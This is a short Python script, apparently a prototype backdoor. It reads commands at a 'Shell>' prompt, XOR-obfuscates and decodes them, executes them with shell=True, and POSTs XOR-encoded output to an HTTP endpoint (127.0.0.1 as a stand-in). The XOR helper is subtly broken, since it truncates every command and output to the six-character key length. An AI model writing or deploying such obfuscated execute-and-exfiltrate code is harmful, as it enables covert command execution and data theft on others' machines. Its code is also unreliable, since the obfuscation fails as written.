import requests
import time
import subprocess
import os

key = 'ABC123'

def xor_str(data, xor_key):
   return ''.join([chr(ord(x) ^ ord(y)) for (x,y) in zip(data, xor_key)])


def run_cmd(cmd):
  
  cmd_decoded = xor_str(cmd, key)
  ps = subprocess.run(cmd_decoded, capture_output=True, shell=True)

  out = ps.stdout.decode()
  err = ps.stderr.decode()
  
  
  encoded_output = xor_str(cmd_decoded + " >> " + out,key)
  encoded_err_output = xor_str(cmd_decoded + " >> " + err,key)
  

  if out:
     post_req= requests.post(url='http://127.0.0.1', data=encoded_output)
     print(out)
  elif err:
     post_req= requests.post(url='http://127.0.0.1', data=encoded_err_output)
     print(err)

cmd = ""

while cmd.strip() != "q":
    cmd = input("Shell> ")
    if cmd != 'q':  
       cmd_encoded = xor_str(cmd,key)
       run_cmd(cmd_encoded)
    elif cmd == 'q':
        print("bye.")
        break
